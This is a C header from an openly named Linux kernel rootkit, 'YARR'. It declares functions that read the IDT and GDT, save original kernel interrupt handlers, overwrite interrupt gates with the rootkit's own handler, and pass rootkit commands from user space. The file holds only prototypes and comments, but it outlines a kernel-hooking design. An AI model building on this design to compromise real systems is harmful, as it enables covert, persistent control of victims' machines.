/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_WE_HOOK_MIGHTY_INTERRUPTS
#define __YARR_WE_HOOK_MIGHTY_INTERRUPTS

#include <asm/desc_defs.h>

#include "types.h"

/***
 * Returns the nth entry in the IDT.
 *
 * @n: The index of the entry to be returned.
 * @return: The nth IDT entry or NULL if there were errors.
 */
struct desc_struct *getIDTEntry(int n);

/***
 * Returns the nth entry in the GDT.
 *
 * @n: The index of the entry to be returned.
 * @return: The nth GDT entry or NULL if there were errors.
 */
struct desc_struct *getGDTEntry(int n);

/***
 * Returns the address of the nth interrupt descriptor.
 *
 * @n: The index of the interrupt descriptor to be returned.
 * @return: The address of the nth interrupt descriptor or NULL if there were
 *          errors.
 */
unsigned long *getIntrDesc(int n);

/***
 * Copies the IDT entry pointed by orig into the buffer pointed by dest.
 *
 * @dest: The destination buffer where the data pointed by orig will be copied.
 * @orig: The source from where the data is read.
 */
void cpyIDTEntry(gate_desc *dest, gate_desc *orig);

/***
 * Saves the nth IDT entry on buf.
 *
 * @n: The index of the IDT entry to be saved.
 * @buf: The buffer where the data will be stored.
 * @return: Zero on success or -1 if there where errors.
 */
int saveKernelHandler(unsigned int n, gate_desc *buf);

/***
 * Sets the nth IDT entry to point to the function stored in addr.
 *
 * @n: The index of the IDT entry to override.
 * @addr: The function that IDT entry will point to.
 */
void setGate(unsigned int n, unsigned long addr);

/***
 * Install yarrIntrDesc as the interrupt descriptor on the specified interrupt.
 *
 * @n: The interrupt to be requested.
 * @return: Zero if everything went right or -1 if there were errors.
 */
int installIntrDesc(unsigned int n);

/***
 * Sets the handler for the nth interrupt as the ignore_int function.
 *
 * @n: The index of the interrupt to ignore.
 * @return: Zero if everything went right or -1 if there were errors.
 */
void uninstallIntrDesc(unsigned int n);

/***
 * The interrupt descriptor for YARR. This work is splitted into two functions,
 * the first one (this one) is written in assembler on src/intrhandler.S.
 */
void yarrIntrDesc(void);

/***
 * The second function of our interrupt handler, this one is written in C on
 * src/interrupt.c.
 */
asmlinkage void do_yarrIntrDesc(yarrOps code, const syscallData __user *data);

#endif /* __YARR_WE_HOOK_MIGHTY_INTERRUPTS */

